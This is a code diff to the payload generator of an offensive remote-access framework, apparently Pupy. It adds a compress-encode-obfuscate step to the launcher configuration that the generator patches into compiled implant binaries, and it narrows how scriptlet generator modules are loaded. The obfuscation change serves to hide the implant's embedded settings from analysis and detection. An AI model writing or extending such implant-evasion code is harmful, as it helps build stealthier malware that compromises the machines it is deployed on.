@@ -7,6 +7,7 @@ import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarf
 from pupylib.utils.network import get_local_ip
 from pupylib.utils.term import colorize
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
+from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
 from network.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
@@ -42,23 +43,28 @@ def get_edit_binary(path, conf):
 	elif len(offsets)!=1:
 		raise Exception("Error: multiple offsets to edit the config have been found")
 
-	new_conf=get_raw_conf(conf)
+	new_conf=get_raw_conf(conf, obfuscate=True)
 	new_conf+="\n\x00\x00\x00\x00\x00\x00\x00\x00"
 	if len(new_conf)>4092:
 		raise Exception("Error: config or offline script too long\nYou need to recompile the dll with a bigger buffer")
 	binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
 	return binary
 
-def get_raw_conf(conf):
+def get_raw_conf(conf, obfuscate=False):
 	if not "offline_script" in conf:
 		offline_script=""
 	else:
 		offline_script=conf["offline_script"]
 	new_conf=""
-	new_conf+="LAUNCHER=%s\n"%(repr(conf['launcher']))
-	new_conf+="LAUNCHER_ARGS=%s\n"%(repr(conf['launcher_args']))
+	obf_func=lambda x:x
+	if obfuscate:
+		obf_func=compress_encode_obfs
+
+	new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
+	new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
 	new_conf+=offline_script
 	new_conf+="\n"
+	
 	return new_conf
 
 
@@ -141,11 +147,12 @@ def load_scriptlets():
 		if is_pkg:
 			module=loader.find_module(module_name).load_module(module_name)
 			for loader2, module_name2, is_pkg2 in pkgutil.iter_modules(module.__path__):
-				module2=loader2.find_module(module_name2).load_module(module_name2)
-				if not hasattr(module2, 'ScriptletGenerator'):
-					logging.error("scriptlet %s has no class ScriptletGenerator")
-				else:
-					scl[module_name]=module2.ScriptletGenerator
+				if module_name2=="generator":
+					module2=loader2.find_module(module_name2).load_module(module_name2)
+					if not hasattr(module2, 'ScriptletGenerator'):
+						logging.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
+					else:
+						scl[module_name]=module2.ScriptletGenerator
 	return scl
 
 def parse_scriptlets(args_scriptlet, debug=False):
